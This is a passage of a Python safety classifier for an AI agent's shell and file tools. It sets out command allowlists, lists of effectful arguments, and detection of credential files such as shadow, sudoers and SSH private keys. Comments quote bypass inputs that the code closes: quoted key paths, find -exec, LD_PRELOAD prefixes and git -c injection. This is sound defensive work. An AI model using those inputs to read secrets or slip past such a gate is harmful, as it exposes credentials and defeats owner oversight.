# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2024-2026 Eric Bintner and Halbert Contributors
"""
Tool Safety Framework

Classifies tool operations by risk level and enforces safety policies.
Based on research5.md Part 11.
"""

from enum import Enum
from dataclasses import dataclass
from typing import Dict, FrozenSet, List, Set, Pattern, Optional, Union
import fnmatch
import json
import os
import re
import logging
from pathlib import Path, PurePosixPath

logger = logging.getLogger('halbert.tools.safety')

_HOME = str(Path.home())


_RISK_ORDER = {
    "safe": 0, "low": 1, "medium": 2, "high": 3, "critical": 4,
}


class RiskLevel(Enum):
    """Risk classification for tool operations."""
    SAFE = "safe"           # Auto-execute, no logging needed
    LOW = "low"             # Auto-execute, log for audit
    MEDIUM = "medium"       # Execute, warn user in response
    HIGH = "high"           # Require explicit user confirmation
    CRITICAL = "critical"   # Block entirely, never execute


@dataclass
class SafetyRule:
    """A rule for classifying command safety."""
    pattern: Pattern
    risk_level: RiskLevel
    reason: str


@dataclass
class SafetyCheckResult:
    """Result of a safety classification check.

    ``allowed`` is the executor's refusal contract: False means refuse
    outright, regardless of confirmation — no confirmed=True path may
    override it (CRITICAL classifications and RoleGate speaker-role
    blocks both carry allowed=False).
    """
    risk_level: RiskLevel
    allowed: bool
    requires_confirmation: bool
    reason: str
    matched_rule: Optional[str] = None


# Thread meta-tools (Plan A, spec §7). PLANNING handles them inline; they
# never reach the executor's handler path, but they are registered so the
# model sees their schemas and the safety framework never treats them as
# unknown (MEDIUM) tools.
THREAD_META_TOOLS = ("new_thread", "recall_thread", "resume_thread")


#: Filenames whose *contents* are a credential. Reading one is the harm.
#:
#: Deliberately keyed on the FILENAME, not the directory. A directory rule on
#: ~/.ssh or /etc/ssh would gate `sshd_config` — the file `routes/editor.py`
#: exists to edit — and `known_hosts`, which is ordinary troubleshooting. A gate
#: that fires on the flagship use case is a gate the owner switches off, and
#: then it protects nothing. Reading `sshd_config` is not the harm; reading the
#: private key next to it is.
#:
#: Before this, `read_file` returned SAFE for every path (`_classify_builtin`),
#: so /etc/shadow and ~/.ssh/id_ed25519 auto-executed. The `cat` path was no
#: better: SENSITIVE_PATHS elevates by exactly one level, and SAFE -> LOW still
#: auto-runs. Only MEDIUM -> HIGH ever gated anything.
_SECRET_BASENAMES: Set[str] = {
    "shadow", "gshadow", "sudoers", "master.passwd",
    "credentials", "identity", ".netrc", "netrc", ".pgpass", ".my.cnf",
    ".htpasswd", "api-token", ".env",
}

#: Suffixes that mean "this file is a key or a keystore".
_SECRET_SUFFIXES: tuple = (
    ".pem", ".key", ".p12", ".pfx", ".jks", ".keystore", ".kdbx", ".ppk", ".asc",
)


def _command_reads_secret(command: str) -> Optional[str]:
    """The credential a command line names, or None.

    Every whitespace token is tested, quotes stripped. Quoting is the bypass
    that matters here: a path analysis fed raw whitespace-split tokens sees
    ``"/Users/me/.ssh/id_ed25519"`` as a token that does not start with ``/``
    and drops it, so one pair of quotes skips the whole check.
    """
    if not command:
        return None
    for token in command.split():
        hit = _secret_read(token)
        if hit:
            return hit
    return None


def _secret_read(path: str) -> Optional[str]:
    """The credential this path names, or None.

    Quote-tolerant: a model writes ``cat "/Users/me/.ssh/id_ed25519"`` about as
    often as the bare form, and a check that only sees the bare form is a check
    one keystroke from being skipped.
    """
    if not path:
        return None
    cleaned = path.strip().strip("'\"")
    if not cleaned:
        return None
    name = PurePosixPath(cleaned).name
    lowered = name.lower()

    # A public key is not a secret, and it lives beside one — check this first
    # or `id_ed25519.pub` matches the private-key rule below.
    if lowered.endswith(".pub"):
        return None
    if lowered in _SECRET_BASENAMES:
        return name
    if lowered.startswith("id_"):
        return name
    if lowered.endswith(_SECRET_SUFFIXES):
        return name
    return None


def _command_segments(command: str) -> List[str]:
    """Each segment of a shell line, normalised to what it actually runs.

    Splits on the separators a shell treats as "start of a new command", then
    strips leading `sudo`/`doas`/`env` and any VAR=value prefixes, and reduces
    the executable to its basename. So `sudo /sbin/mkfs.ext4 /dev/sda1` and
    `mkfs.ext4 /dev/sda1` normalise to the same thing.

    This exists so a blocked-command pattern can be anchored to the head of a
    segment. Matching it anywhere in the string made `man mkfs`,
    `which mkfs.ext4` and `grep mkfs /var/log/syslog` CRITICAL and blocked --
    a classifier that stops you reading the manual teaches people to turn it
    off.

    NOTE: this view strips `sudo`/`env`/VAR=value prefixes, which is right
    for *blocking* (a sudo'd rm is still an rm) and wrong for *vouching*:
    `LD_PRELOAD=/tmp/x.so ls` is not an innocent `ls`. The read-only lane
    below therefore does NOT use this function; it refuses any segment whose
    first token carries `=` or is a wrapper. One string, two consumers with
    opposite needs.
    """
    segments = []
    for raw in re.split(r"&&|\|\||;|\||\n", command):
        tokens = raw.strip().split()
        i = 0
        while i < len(tokens) and (tokens[i] in ("sudo", "doas", "env")
                                   or "=" in tokens[i]):
            i += 1
        if i >= len(tokens):
            continue
        tokens = list(tokens[i:])
        tokens[0] = tokens[0].rsplit("/", 1)[-1]
        segments.append(" ".join(tokens))
    return segments


def _normalise_path(value: str) -> str:
    """One canonical form for a path, for comparison only (A13 bug 5).

    Expands ``~``, makes it absolute, collapses ``.`` and ``..``, and
    resolves symlinks where it can. Comparison only: nothing is opened
    with the result, and a path that cannot be resolved (it does not
    exist yet -- a write target usually does not) still gets the textual
    normalisation, which is what catches ``/./tank/data/x``.
    """
    text = str(value or "").strip()
    if not text:
        return ""
    try:
        expanded = os.path.abspath(os.path.expanduser(text))
    except Exception:
        return text
    try:
        return os.path.realpath(expanded)
    except OSError:
        return expanded


def _within_path(candidate: str, root: str) -> bool:
    """Whether ``candidate`` is ``root`` or sits inside it.

    Segment-aware, so ``/bootleg`` is not inside ``/boot`` -- the
    over-match the refuter named as the other half of this bug.
    """
    if not candidate or not root:
        return False
    root = root.rstrip(os.sep) or os.sep
    if candidate == root:
        return True
    return candidate.startswith(root + os.sep)


def _resolved_root(path: str) -> str:
    """A sensitive-path constant in the spelling a resolved candidate has.

    ``_classify_write`` and the elevation both resolve the path under test
    before comparing it. On macOS ``/etc`` is a symlink to ``/private/etc``
    and ``/var`` to ``/private/var``, so a constant left unresolved matched
    nothing once the candidate had been through ``realpath`` -- the same
    hole `101241da` closed in the sandbox's rule set, in the other file that
    keeps a table of paths. The trailing separator is preserved because the
    set is written with one and ``_within_path`` strips it anyway.
    """
    text = str(path or "").rstrip(os.sep)
    if not text:
        return path
    try:
        return os.path.realpath(text) + os.sep
    except OSError:
        return path


def _platform_sensitive_dirs() -> tuple:
    """Halbert's own config and data directories, as path prefixes.

    Resolved through ``utils.platform`` rather than assumed, because the
    whole point of A17-G3 is that the assumed shape (``~/.config``) is
    not where the files are on this host. Imported lazily and guarded:
    the classifier must still load if the platform module cannot resolve
    a home directory, and a missing entry here is a missing protection,
    never a crash on import.
    """
    dirs = []
    try:
        from ..utils.platform import get_config_dir, get_data_dir
        for resolve in (get_config_dir, get_data_dir):
            try:
                dirs.append(str(resolve()).rstrip("/") + "/")
            except Exception:
                continue
    except Exception:  # pragma: no cover - import-time only
        logger.warning(
            "platform directories unavailable; Halbert's own config "
            "directory is not in SENSITIVE_PATHS"
        )
    return tuple(dirs)

# ---------------------------------------------------------------------------
# The read-only lane
#
# What follows replaces nine ``^(ls|dir|find|locate)\s*``-style regexes that
# matched a bare prefix: `lsof`, `idle_hack`, `filebeat`, `statistics_upload`,
# `iptables -F` and `find / -name '*.key' -exec sh -c ...` all classified
# SAFE on the strength of their first two letters. The default branch used to
# run anything unmatched at MEDIUM, so every gap in the tables was an open
# door. The default is now HIGH: an unrecognised command asks. Measured
# against Halbert's own 262-command repertoire that lands at ~11% prompts
# (the plan's unallowlisted `unknown -> HIGH` measured 82.8%, which is not a
# gate an owner keeps), and the owner drains the residual through
# ``user_overrides`` (the "always allow this" store).
# ---------------------------------------------------------------------------

#: Read-only invocations, keyed on the exact executable name. ``True`` means
#: the whole binary only observes; a frozenset means only those first
#: operands do. A command absent from this table is not called safe.
#:
#: Two deliberate absences:
#:   * pagers and pager-hosts (``less``, ``more``, ``info``). A pager
#:     executes ``$PAGER``/``-P``/``LESSOPEN`` as a shell command -- a vouched
#:     binary whose arguments select a program is not read-only. The PTY layer
#:     neuters pager env vars for sessions it owns; nothing protects a direct
#:     spawn, so these prompt. ``man`` is keyed on the *path-query* spellings
#:     (``-w``/``-k``/``-f``) which never invoke a pager and never take a
#:     pager argument; bare ``man <page>`` prompts.
#:   * ``dscl``: its first argument is a *node selector* (``.``), not a verb --
#:     ``dscl . -create`` follows the same spelling as ``dscl . -read``. A
#:     first-argument table cannot express it, so it prompts.
READ_ONLY_COMMANDS: Dict[str, Union[bool, FrozenSet[str]]] = {
    # coreutils and inspection
    "ls": True, "dir": True, "vdir": True, "cat": True, "head": True,
    "tail": True, "wc": True, "sort": True, "uniq": True, "cut": True,
    "tr": True, "column": True, "nl": True, "od": True,
    # `xxd` is off the table: its second positional operand is an OUTPUT
    # file (`xxd a /tmp/out`) and `-r` reverts a dump back into binary.
    # Neither is expressible as a first-operand frozenset. `od` and
    # `hexdump`, which only ever write to stdout, stay.
    "strings": True, "basename": True, "dirname": True, "readlink": True,
    "realpath": True, "stat": True, "file": True, "du": True, "df": True,
    "tree": True, "find": True, "locate": True, "pwd": True,
    "whoami": True, "id": True, "groups": True, "who": True, "w": True,
    "last": True, "uname": True,
    # `hostname <name>` sets it; `date <MMDDhhmm>` sets the clock. Both
    # report when bare, so the frozenset keeps the reporting spellings and
    # refuses a bare operand. "+" vouches `date +FORMAT` specifically.
    "hostname": frozenset({"-f", "--fqdn", "-s", "--short", "-d", "--domain",
                           "-i", "-I", "--all-ip-addresses", "--all-fqdns",
                           "-A", "-y", "--yp", "--nis"}),
    "date": frozenset({"+", "-u", "--utc", "--universal", "-R", "--rfc-2822",
                       "--rfc-3339", "--iso-8601", "-I", "-r", "-d", "--date",
                       "-j", "-f", "--file", "--debug", "--reference"}),
    "uptime": True, "echo": True, "printf": True, "printenv": True,
    "which": True, "whereis": True, "type": True,
    "apropos": True, "whatis": True,
    "man": frozenset({"-w", "--where", "--path", "-k", "--apropos",
                      "-f", "--whatis"}),
    "getent": True, "locale": True, "tty": True, "arch": True,
    "grep": True, "egrep": True, "fgrep": True, "rg": True, "ag": True,
    # processes and memory
    "ps": True, "top": True, "htop": True, "btop": True, "free": True,
    "vmstat": True, "iostat": True, "mpstat": True, "sar": True,
    "pgrep": True, "pidof": True, "lsof": True, "vm_stat": True,
    "pstree": True,
    # hardware and host facts
    "lspci": True, "lsusb": True, "lscpu": True, "lsmod": True,
    "lsblk": True, "findmnt": True, "blkid": True, "dmidecode": True,
    "sensors": True, "nvidia-smi": True, "rocm-smi": True,
    "mokutil": True, "sw_vers": True, "system_profiler": True,
    "ioreg": True, "smartctl": True, "kextstat": True, "getenforce": True,
    "systemd-detect-virt": True, "systemd-analyze": True,
    # The *ctl family reports when bare and writes when given a verb:
    # `timedatectl set-timezone`, `hostnamectl set-hostname`,
    # `localectl set-locale`, `loginctl terminate-session`/`kill-user`.
    # The bare invocation still runs -- it is the status output.
    "hostnamectl": frozenset({"status", "show"}),
    "localectl": frozenset({"status", "list-locales", "list-keymaps",
                            "list-x11-keymap-models", "list-x11-keymap-layouts",
                            "list-x11-keymap-variants", "list-x11-keymap-options"}),
    "timedatectl": frozenset({"status", "show", "list-timezones",
                              "show-timesync", "timesync-status"}),
    "loginctl": frozenset({"list-sessions", "list-users", "list-seats",
                           "show-session", "show-user", "show-seat",
                           "session-status", "user-status", "seat-status"}),
    "tlp-stat": True, "lsattr": True, "getfacl": True,
    # network, read-only
    "ping": True, "ping6": True, "traceroute": True, "dig": True,
    "host": True, "nslookup": True, "ss": True, "netstat": True,
    "ifconfig": True, "iwconfig": True, "arp": True,
    # `scutil` is off the table entirely, not narrowed: bare, it opens an
    # interactive session where `set`/`add` arrive over stdin, which no
    # frozenset on argv can see. Same exclusion as the pager-hosts above,
    # for the same reason. `scutil --get` reaches the owner allowlist.
    "resolvectl": frozenset({"status", "query", "statistics",
                             "show-cache", "reset-statistics"}),
    "ip": frozenset({"addr", "a", "link", "l", "route", "r", "neigh", "n"}),
    "iptables": frozenset({"-L", "-S", "--list", "--list-rules"}),
    "nft": frozenset({"list"}),
    "route": frozenset({"-n", "get"}),
    "iw": frozenset({"dev", "list", "phy", "reg"}),
    "wg": frozenset({"show"}),
    "tailscale": frozenset({"status", "ip", "netcheck", "version", "whois",
                            "drive"}),
    "nmcli": frozenset({"device", "connection", "general", "networking",
                        "radio", "show"}),
    "firewall-cmd": frozenset({"--state", "--list-all", "--get-zones",
                               "--get-active-zones", "--list-services"}),
    "ufw": frozenset({"status"}),
    "networksetup": frozenset({"-listallnetworkservices", "-getinfo",
                               "-listallhardwareports", "-getdnsservers"}),
    "socketfilterfw": frozenset({"--getglobalstate", "--getstealthmode",
                                 "--listapps", "--getblockall"}),
    "fail2ban-client": frozenset({"status", "get"}),
    "aa-status": True,
    # services and logs
    "journalctl": True, "dmesg": True,
    "systemctl": frozenset({"status", "show", "cat", "list-units",
                            "list-timers", "list-sockets", "list-unit-files",
                            "list-jobs", "list-dependencies", "is-active",
                            "is-enabled", "is-failed", "is-system-running",
                            "get-default", "show-environment"}),
    "launchctl": frozenset({"list", "print", "print-disabled", "dumpstate"}),
    "service": frozenset({"--status-all"}),
    "udevadm": frozenset({"info", "monitor"}),
    # package managers, query verbs only
    "apt": frozenset({"list", "show", "search", "policy", "depends",
                      "rdepends"}),
    "apt-cache": True,
    "apt-mark": frozenset({"showhold", "showauto", "showmanual"}),
    "dpkg": frozenset({"-l", "-L", "-s", "-S", "--list", "--status",
                       "--search"}),
    "dpkg-query": True,
    "rpm": frozenset({"-q", "-qa", "-qi", "-ql", "-qf", "--query"}),
    "dnf": frozenset({"list", "info", "search", "check-update", "repoquery",
                      "history", "repolist"}),
    "yum": frozenset({"list", "info", "search", "check-update", "repolist"}),
    "pacman": frozenset({"-Q", "-Qi", "-Ql", "-Qs", "-Qe", "-Qdt", "-Qdtq",
                         "-Si", "-Ss", "-F"}),
    "checkupdates": True,
    "brew": frozenset({"list", "ls", "info", "outdated", "config", "deps",
                       "search", "home", "leaves", "uses", "desc", "doctor",
                       "--version", "--prefix", "--cellar"}),
    "port": frozenset({"installed", "list", "info", "outdated", "echo"}),
    "mas": frozenset({"list", "outdated", "info", "account"}),
    "snap": frozenset({"list", "info", "find", "changes", "connections",
                       "services", "version", "--list"}),
    "flatpak": frozenset({"list", "info", "search", "history", "remotes",
                          "remote-ls"}),
    "pip": frozenset({"list", "show", "freeze", "check", "--version"}),
    "pip3": frozenset({"list", "show", "freeze", "check", "--version"}),
    "npm": frozenset({"ls", "list", "view", "outdated", "--version"}),
    # containers and orchestration, read verbs
    "docker": frozenset({"ps", "images", "info", "inspect", "logs",
                         "version", "stats", "port", "top", "diff",
                         "history", "events", "--version"}),
    "podman": frozenset({"ps", "images", "info", "inspect", "logs",
                         "version", "stats", "port", "diff", "history",
                         "--version"}),
    "kubectl": frozenset({"get", "describe", "logs", "top", "explain",
                          "api-resources", "version", "cluster-info"}),
    "helm": frozenset({"list", "ls", "status", "get", "history", "show",
                       "search", "version"}),
    "virsh": frozenset({"list", "dominfo", "domstate", "net-list",
                        "pool-list"}),
    "VBoxManage": frozenset({"list", "showvminfo"}),
    "lxc": frozenset({"list", "info", "config"}),
    # storage and backup, read verbs
    "zfs": frozenset({"list", "get", "holds", "version"}),
    "zpool": frozenset({"list", "status", "get", "history", "iostat",
                        "version"}),
    "btrfs": frozenset({"filesystem", "fi", "subvolume", "device", "qgroup"}),
    "snapper": frozenset({"list", "list-configs", "get-config", "status"}),
    "diskutil": frozenset({"list", "info", "apfs", "cs"}),
    "tmutil": frozenset({"destinationinfo", "latestbackup", "listbackups",
                         "listlocalsnapshots", "status", "machinedirectory"}),
    "rclone": frozenset({"listremotes", "ls", "lsd", "lsjson", "about",
                         "version"}),
    "mdadm": frozenset({"--detail", "--examine", "-D", "-E"}),
    "swapon": frozenset({"--show", "-s"}),
    "exportfs": frozenset({"-v", "-s"}),
    "efibootmgr": frozenset({"-v", "--verbose"}),
    "testparm": frozenset({"-s", "--suppress-prompt"}),
    # source control
    "git": frozenset({"status", "log", "diff", "show", "branch", "remote",
                      "describe", "blame", "shortlog", "ls-files",
                      "rev-parse", "tag", "reflog", "grep", "cat-file",
                      "rev-list", "ls-remote", "count-objects",
                      "--version"}),
    # desktop, audio, power, misc
    "gsettings": frozenset({"get", "list-keys", "list-schemas",
                            "list-recursively"}),
    "defaults": frozenset({"read", "read-type", "domains"}),
    "pactl": frozenset({"list", "info", "stat", "get-sink-volume",
                        "get-default-sink", "get-default-source"}),
    "pw-cli": frozenset({"info", "ls", "dump"}),
    "pipewire": frozenset({"--version"}),
    "timeshift": frozenset({"--list"}),
    "pyenv": frozenset({"version", "versions", "version-name", "root",
                        "prefix", "whence", "which", "--version"}),
    "fuser": True,
    "xrandr": frozenset({"--query", "-q"}),
    "prime-select": frozenset({"query"}),
    "powerprofilesctl": frozenset({"get", "list"}),
    "pmset": frozenset({"-g"}),
    "csrutil": frozenset({"status"}),
    "spctl": frozenset({"--status", "--assess"}),
    "fdesetup": frozenset({"status", "list", "isactive"}),
    "codesign": frozenset({"-d", "-dv", "--display", "-v", "--verify"}),
    "plutil": frozenset({"-p", "-lint"}),
    "softwareupdate": frozenset({"-l", "--list"}),
    "log": frozenset({"show", "stats"}),
    "sysctl": frozenset({"-a", "-n", "-A", "-e"}),
    "crontab": frozenset({"-l"}),
    "ollama": frozenset({"list", "ps", "show", "--version"}),
    "fpcalc": True,
}

#: Arguments that revoke a read-only verdict for a binary that is otherwise
#: in READ_ONLY_COMMANDS. ``find`` is the reason this table exists: it is far
#: too useful to gate, and ``-exec`` turns it into a general-purpose
#: execution engine -- ``find / -name '*.key' -exec sh -c '...' \;``
#: classified SAFE, "Directory listing", and ran without a prompt.
EFFECTFUL_ARGS: Dict[str, Set[str]] = {
    "find": {"-exec", "-execdir", "-ok", "-okdir", "-delete", "-fls",
             "-fprint", "-fprint0", "-fprintf", "-newer", "-newermt",
             "-newerXY"},
    "ip": {"set", "add", "del", "delete", "change", "replace", "flush",
           "up", "down"},
    "iptables": {"-A", "-I", "-D", "-R", "-N", "-X", "-F", "-Z", "-P"},
    "nmcli": {"up", "down", "modify", "add", "delete", "edit", "reload"},
    "nft": {"add", "delete", "flush", "insert", "replace"},
    "sysctl": {"-w", "-p", "--write", "--load"},
    "btrfs": {"delete", "balance", "resize"},
    "zfs": {"destroy", "rollback", "receive", "send"},
    "log": {"collect", "erase", "config"},
    "plutil": {"-convert", "-replace", "-insert", "-remove"},
    "git": {"--exec-path", "-c"},
    "crontab": {"-r", "-e", "-i"},
    "journalctl": {"--vacuum-time", "--vacuum-size", "--vacuum-files",
                   "--rotate", "--flush", "--sync", "--relinquish-var",
                   "--smart-relinquish-var"},
    "fuser": {"-k", "--kill", "-w"},
    "man": {"-P", "--pager"},
    # Interface configuration: `ifconfig en0 down`, `iwconfig wlan0 essid x`.
    # The interface name is the first operand and is arbitrary, so the verb
    # that follows it can only be caught here.
    "ifconfig": {"up", "down", "add", "del", "delete", "netmask", "mtu",
                 "broadcast", "alias", "-alias", "promisc", "-promisc",
                 "media", "create", "destroy", "plumb", "unplumb", "tunnel",
                 "hw", "txqueuelen"},
    "iwconfig": {"essid", "mode", "freq", "channel", "ap", "nick", "rate",
                 "bit", "rts", "frag", "key", "enc", "power", "txpower",
                 "sens", "retry", "modu", "commit"},
    # `arp -s` writes the table, `-d` deletes, `-f` loads a file of entries.
    "arp": {"-s", "--set", "-d", "--delete", "-f", "--file"},
    # `dmesg -C` clears the kernel ring buffer -- destroying the evidence a
    # diagnostic command exists to read. `-w`/`--follow` stays read-only.
    "dmesg": {"-C", "--clear", "-c", "--read-clear", "-D", "--console-off",
              "-E", "--console-on", "-n", "--console-level"},
    # nvidia-smi is a reporting tool with a configuration half.
    "nvidia-smi": {"-pm", "--persistence-mode", "-e", "--ecc-config",
                   "-c", "--compute-mode", "-ac", "--applications-clocks",
                   "-rac", "--reset-applications-clocks", "-lgc",
                   "--lock-gpu-clocks", "-rgc", "--reset-gpu-clocks",
                   "-pl", "--power-limit", "-r", "--gpu-reset",
                   "-p", "--reset-ecc-errors", "--gom", "-am",
                   "--accounting-mode", "-caa", "--clear-accounted-apps",
                   "-dm", "--driver-model", "-fdm", "--force-driver-model"},
    # Secure Boot key enrolment. `--sb-state` and the list verbs only read.
    "mokutil": {"--disable-validation", "--enable-validation", "--import",
                "--delete", "--revoke-import", "--revoke-delete", "--reset",
                "--set-verbosity", "--import-hash", "--delete-hash",
                "--password", "--clear-password", "--set-sbat-policy",
                "--generate-hash", "--set-fallback-verbosity",
                "--disable-fallback-verbosity", "--set-fallback-noreboot"},
    # `sort -o FILE` writes; every other sort spelling goes to stdout.
    "sort": {"-o", "--output"},
}

#: Leading flags a binary may carry before its verb without changing what the
#: verb means. ``True`` consumes the flag's separate value (``-C dir``);
#: ``False`` is a bare switch. One entry per binary, and the dangerous
#: neighbours are named so nobody adds them thinking they are inert:
#: ``git -c`` (config injection redefines an alias to a shell command),
#: ``git --exec-path``, ``docker -H/--host`` (repoints the daemon) and
#: ``docker --config`` (credential helpers are executed), ``kubectl
#: --kubeconfig`` (exec auth plugins run a program), ``systemctl --root``.
#: A flag not in this table ends the read-only verdict. Flags only matter for
#: frozenset entries -- a ``True`` entry vouches the binary whole.
INERT_LEADING_FLAGS: Dict[str, Dict[str, bool]] = {
    "git": {"-C": True, "--git-dir": True, "--work-tree": True,
            "--namespace": True, "--no-pager": False, "-P": False,
            "--no-optional-locks": False, "--literal-pathspecs": False,
            "--no-lazy-fetch": False},
    "docker": {"--context": True, "-D": False, "--debug": False,
               "-l": True, "--log-level": True},
    "podman": {"--context": True, "-l": True, "--log-level": True},
    "systemctl": {"--user": False, "--system": False, "--failed": False,
                  "--no-pager": False, "--full": False, "-a": False,
                  "--all": False, "--no-legend": False, "-q": False,
                  "--quiet": False, "--plain": False, "-l": False},
    "kubectl": {"--context": True, "-n": True, "--namespace": True},
    "ip": {"-j": False, "-json": False, "-d": False, "-details": False,
           "-br": False, "-brief": False, "-4": False, "-6": False,
           "-s": False, "-stats": False, "-iec": False},
    "nmcli": {"-t": False, "--terse": False, "-f": True, "--fields": True,
              "-g": True, "--get-values": True, "-m": True, "--mode": True,
              "-c": True, "--colors": True},
    "zfs": {"-H": False, "-p": False, "-o": True},
    "zpool": {"-H": False, "-p": False, "-o": True},
    "snapper": {"-c": True, "--config": True},
    "npm": {"--prefix": True, "-g": False, "--global": False},
    "pip": {"--quiet": False, "-q": False},
}

#: Wrappers whose whole purpose is running something else under an altered
#: environment. A vouched command reached through one of them is not the
#: vouched command, so they never enter the read-only lane.
#: Second-operand vouching. A frozenset entry in READ_ONLY_COMMANDS constrains
#: only the FIRST operand, so a binary whose effect hides one word further in
#: rides through on a vouched verb: ``git branch -D``, ``git remote add``,
#: ``git tag <name>`` and ``tailscale drive share`` all classified SAFE on the
#: strength of ``branch``/``remote``/``tag``/``drive``. Where a verb appears
#: here, the token after it must be absent -- the bare verb lists -- or itself
#: vouched. Listing the read-only spellings rather than the effectful ones is
#: deliberate: a new subcommand is refused until someone reads it, which is
#: the same fail direction as the table above.
SUBVERBS: Dict[str, Dict[str, FrozenSet[str]]] = {
    "git": {
        "branch": frozenset({
            "-l", "--list", "-a", "--all", "-r", "--remotes", "-v", "-vv",
            "--verbose", "--show-current", "--contains", "--no-contains",
            "--merged", "--no-merged", "--points-at", "--format", "--sort",
            "--color", "--no-color", "--column",
        }),
        # `show` and `get-url` read; `add`, `remove`, `rename`, `set-url`,
        # `set-head` and `prune` all write .git/config or the remote refs.
        "remote": frozenset({"-v", "--verbose", "show", "get-url"}),
        # A bare `git tag <name>` CREATES the tag -- no flag involved, which
        # is why the effectful spellings cannot be enumerated here.
        "tag": frozenset({
            "-l", "--list", "-n", "--contains", "--no-contains", "--points-at",
            "--merged", "--no-merged", "--format", "--sort", "--column",
        }),
    },
    # `tailscale drive share` exports a host directory over Taildrive.
    "tailscale": {"drive": frozenset({"list", "ls"})},
}

_WRAPPER_HEADS = frozenset({
    "sudo", "doas", "env", "xargs", "nice", "nohup", "stdbuf", "timeout",
    "command", "builtin", "exec", "chroot", "setsid", "watch", "parallel",
})


def _segment_tokens(segment: str) -> Optional[List[str]]:
    """The tokens of one shell segment, with quotes resolved and REMOVED.

    Returns None when quoting is unbalanced. This is the fix for a live
    bypass: a tokeniser that keeps quote characters sees
    ``cat "/Users/me/.ssh/id_ed25519"`` as a token that does not start with
    ``/``, drops it from the path analysis, and one pair of quotes has
    skipped the credential tier. The read-only verdict and the path analysis
    below both consume this one tokeniser -- two segmenters computing two
    answers from one string is how the bypass existed.
    """
    tokens: List[str] = []
    current: List[str] = []
    had_token = False
    quote: Optional[str] = None
    i, n = 0, len(segment)
    while i < n:
        ch = segment[i]
        if quote:
            if ch == "\\" and quote == '"' and i + 1 < n:
                current.append(segment[i + 1])
                i += 2
                continue
            if ch == quote:
                quote = None
                i += 1
                continue
            current.append(ch)
            i += 1
            continue
        if ch in ("'", '"'):
            quote = ch
            had_token = True
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            current.append(segment[i + 1])
            had_token = True
            i += 2
            continue
        if ch.isspace():
            if current or had_token:
                tokens.append("".join(current))
                current = []
                had_token = False
            i += 1
            continue
        current.append(ch)
        i += 1
    if quote is not None:
        return None
    if current or had_token:
        tokens.append("".join(current))
    return tokens


def _has_unquoted_redirect(command: str) -> bool:
    """True when the line redirects. ``grep 'a > b' file`` is NOT a redirect:
    the angle bracket is quoted, and a raw-substring check gated it (the gate
    that fires on ordinary use is the gate that gets switched off).
    """
    quote: Optional[str] = None
    i, n = 0, len(command)
    while i < n:
        ch = command[i]
        if quote:
            if ch == "\\" and quote == '"' and i + 1 < n:
                i += 2
                continue
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in ("'", '"'):
            quote = ch
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            i += 2
            continue
        if ch in (">", "<"):
            return True
        i += 1
    return False


def _token_as_path(token: str, cwd: Optional[str] = None) -> Optional[str]:
    """One spelling for one file, or None when the token is not a path.

    ``~/.ssh/authorized_keys`` and ``/Users/you/.ssh/authorized_keys`` and
    ``.ssh/authorized_keys`` from $HOME are the same file; the old code
    compared raw command text against home-expanded constants, so only the
    third spelling was protected. Normalising first is the whole fix.

    Expects an unquoted token from ``_segment_tokens`` — see its docstring
    for why that matters.
    """
    if not token or token.startswith("-"):
        return None
    if "=" in token and not token.startswith(("/", "~", ".", "$")):
        token = token.split("=", 1)[1]
        if not token:
            return None
    if not (token.startswith(("/", "~", "./", "../", "$HOME", "${HOME}"))
            or "/" in token or cwd):
        return None
    expanded = token.replace("${HOME}", _HOME).replace("$HOME", _HOME)
    expanded = os.path.expanduser(expanded)
    if not expanded.startswith("/"):
        if not cwd:
            return None
        expanded = os.path.join(cwd, expanded)
    # Resolved, not merely collapsed: the comparison targets are resolved
    # (``_resolved_root``), and ``/etc/x`` and ``/private/etc/x`` are one
    # file. Collapsing alone left the gate decided by which spelling the
    # operator happened to type.
    try:
        return os.path.realpath(expanded)
    except OSError:
        return os.path.normpath(expanded)


def _paths_touched(command: str, cwd: Optional[str] = None) -> List[str]:
    """Every filesystem path this line names, absolute and collapsed.

    ``cwd`` is included and is used to resolve bare operands, because the
    directory a command runs in is part of what it does: `rm grub.cfg` with
    cwd=/boot is `rm /boot/grub.cfg`, and only the second was ever classified.
    """
    base = _token_as_path(cwd) if cwd else None
    paths: List[str] = []
    if base:
        paths.append(base)
    segments = split_shell_command(command)
    if segments is None:
        return paths
    for segment in segments:
        tokens = _segment_tokens(segment)
        if not tokens:
            continue
        for token in tokens[1:]:
            path = _token_as_path(token, base)
            if path:
                paths.append(path)
    return paths



def split_shell_command(command: str) -> Optional[List[str]]:
    """Split a command line into the commands it actually runs.

    Quote-aware, because splitting ``echo "a|b"`` on the pipe would
    invent a second command. Returns None when the line cannot be
    split with confidence -- unbalanced quotes, or a command
    substitution, whose contents run before anything else does. A
    caller that cannot see the segments must not call the line safe.
    """
    if "$(" in command or "`" in command:
        return None
    segments: List[str] = []
    current: List[str] = []
    quote: Optional[str] = None
    i, n = 0, len(command)
    while i < n:
        ch = command[i]
        if quote:
            current.append(ch)
            if ch == "\\" and quote == '"' and i + 1 < n:
                current.append(command[i + 1])
                i += 2
                continue
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in ("'", '"'):
            quote = ch
            current.append(ch)
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            current.append(ch)
            current.append(command[i + 1])
            i += 2
            continue
        if command.startswith("&&", i) or command.startswith("||", i):
            segments.append("".join(current))
            current = []
            i += 2
            continue
        if ch in (";", "|", "\n", "&"):
            segments.append("".join(current))
            current = []
            i += 1
            continue
        current.append(ch)
        i += 1
    if quote is not None:
        return None
    segments.append("".join(current))
    return [s.strip() for s in segments if s.strip()]


def load_user_command_overrides(path: Optional[str] = None) -> Dict[str, Union[bool, FrozenSet[str]]]:
    """The owner's "always allow this" store, if one exists.

    ``<config_dir>/command-allowlist.json``: ``{"systemctl": ["restart"],
    "my-backup-script": true}`` — a binary vouched whole, or vouched for
    named first operands only. This is the drainable end of the read-only
    lane: an unrecognised command prompts once, the owner adds it here, and
    it stops interrupting. Owner-authored only -- the file lives beside the
    other Halbert config and is never written by the agent.
    """
    if path is None:
        try:
            from ..utils.paths import config_dir
            path = os.path.join(config_dir(), "command-allowlist.json")
        except Exception:
            return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            raw = json.load(f)
    except (OSError, ValueError):
        return {}
    out: Dict[str, Union[bool, FrozenSet[str]]] = {}
